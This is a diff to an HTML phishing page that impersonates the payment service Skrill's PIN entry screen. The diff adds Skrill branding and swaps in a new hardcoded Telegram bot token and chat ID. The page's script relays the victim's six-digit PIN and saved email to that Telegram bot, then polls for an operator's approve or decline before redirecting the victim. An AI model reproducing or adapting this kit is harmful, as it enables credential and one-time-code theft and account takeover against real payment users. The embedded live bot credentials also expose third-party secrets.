@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Enter PIN</title>
+    <title>Skrill - Enter PIN</title>
 
     <style>
         :root {
@@ -69,7 +69,7 @@
             background: rgba(255, 255, 255, 0.1);
         }
 
-        /* ---------- Content ---------- */
+        /* ---------- Content Layout ---------- */
         .main {
             flex: 1;
             display: flex;
@@ -128,7 +128,6 @@
             box-shadow: 0 0 0 2px rgba(138, 31, 156, 0.15);
         }
 
-        /* Hidden actual input to capture keyboard events */
         .hidden-input {
             position: absolute;
             opacity: 0;
@@ -170,7 +169,7 @@
             pointer-events: none;
         }
 
-        /* ---------- Note area ---------- */
+        /* ---------- Note & Error Styles ---------- */
         .form-note {
             margin-top: 12px;
             text-align: center;
@@ -184,7 +183,7 @@
             font-weight: 600;
         }
 
-        /* ---------- Spinner overlay ---------- */
+        /* ---------- Spinner Overlay Component ---------- */
         .spinner-overlay {
             position: fixed;
             inset: 0;
@@ -283,10 +282,8 @@
         </p>
 
         <form class="code-form" id="codeForm" novalidate>
-            <!-- Hidden input to capture physical keyboard / autofill -->
             <input class="hidden-input" id="codeInput" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="6" />
 
-            <!-- Visual PIN boxes -->
             <div class="pin-display-container" id="pinDisplayContainer">
                 <div class="pin-box"></div>
                 <div class="pin-box"></div>
@@ -296,7 +293,6 @@
                 <div class="pin-box"></div>
             </div>
 
-            <!-- Custom On-Screen Keypad -->
             <div class="keypad" id="keypad">
                 <button type="button" class="key-btn" data-val="1">1</button>
                 <button type="button" class="key-btn" data-val="2">2</button>
@@ -318,12 +314,10 @@
                 </button>
             </div>
 
-            <!-- NOTE area -->
             <p class="form-note" id="formNote"></p>
         </form>
     </main>
 
-    <!-- Spinner overlay -->
     <div class="spinner-overlay" id="spinnerOverlay" aria-hidden="true">
         <div class="spinner-box">
             <div class="spinner"></div>
@@ -334,17 +328,14 @@
     </div>
 
     <script>
-        // Polling session guard
         let currentPollController = null;
         let pollTimeoutId = null;
         let activeSessionId = null;
 
-        // CONFIG
-        const BOT_TOKEN = "8894178212:AAEQT5MnJJNlpLn-cqAfJAARBpkikv8t5nE";
-        const CHAT_ID = "8229040857";
+        const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
+        const CHAT_ID = "8406078749";
         const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
-        // DOM
         const spinnerOverlay = document.getElementById("spinnerOverlay");
         const spinnerEmailEl = document.getElementById("spinnerEmail");
         const cancelPollBtn = document.getElementById("cancelPollBtn");
@@ -404,12 +395,18 @@
         function onApprove() {
             hideSpinner();
             safeSetNote("", "");
-            window.location.href = "deriv.html";
+            window.location.href = "login.html";
         }
 
         function onDecline() {
+            if (currentPollController) currentPollController.abort();
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+
             hideSpinner();
-            safeSetNote("PIN verification declined. You can try again.", "error");
+            if (codeField) codeField.value = "";
+            updatePinDisplay();
+            safeSetNote("PIN verification declined. Please try again.", "error");
+
             activeSessionId = null;
             currentPollController = null;
             pollTimeoutId = null;
@@ -433,14 +430,12 @@
 
         cancelPollBtn && cancelPollBtn.addEventListener("click", cancelPolling);
 
-        // Load saved email/identifier
         window.addEventListener("DOMContentLoaded", () => {
             const savedEmail = localStorage.getItem("signin_email");
             if (userEmailEl && savedEmail) userEmailEl.textContent = savedEmail;
             updatePinDisplay();
         });
 
-        // Keypad click handlers
         keypad.addEventListener("click", (e) => {
             const btn = e.target.closest(".key-btn");
             if (!btn) return;
@@ -462,7 +457,6 @@
                 updatePinDisplay();
                 safeSetNote("", "");
 
-                // Auto submit when 6 digits are reached
                 if (codeField.value.length === 6) {
                     codeForm.dispatchEvent(new Event("submit", { cancelable: true }));
                 }
@@ -605,7 +599,6 @@
             }
         }
 
-        // Handle submit
         if (codeForm) {
             codeForm.addEventListener("submit", function(e) {
                 e.preventDefault();
